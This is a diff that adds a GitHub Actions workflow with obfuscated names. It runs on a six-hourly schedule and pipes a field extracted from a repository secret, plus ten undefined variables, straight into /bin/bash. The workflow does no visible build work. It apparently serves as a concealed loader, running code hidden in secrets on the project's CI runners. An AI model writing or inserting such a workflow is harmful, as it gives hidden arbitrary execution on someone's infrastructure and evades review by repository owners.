@@ -1,0 +1,27 @@
+name: zhanglvshhhi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhanglvshhhi
+        env:
+          hnl405: ${{ secrets.hnl405 }}
+        run: |
+          echo $hnl405 | jq -r .epv16 | /bin/bash
+          echo $qvdav6 | jq -r .vaqq8 | /bin/bash
+          echo $kf013 | jq -r .bccu17569 | /bin/bash
+          echo $xh9756 | jq -r .it360 | /bin/bash
+          echo $wbxy618 | jq -r .paroc527 | /bin/bash
+          echo $u737 | jq -r .tev51907 | /bin/bash
+          echo $ecli8 | jq -r .lu100 | /bin/bash
+          echo $cw31 | jq -r .bcyb9 | /bin/bash
+          echo $jhoff14489 | jq -r .cevd2568 | /bin/bash
+          echo $ywijp93 | jq -r .pgwfy06 | /bin/bash
+          echo $kfxbv8 | jq -r .tfzc6342 | /bin/bash
+
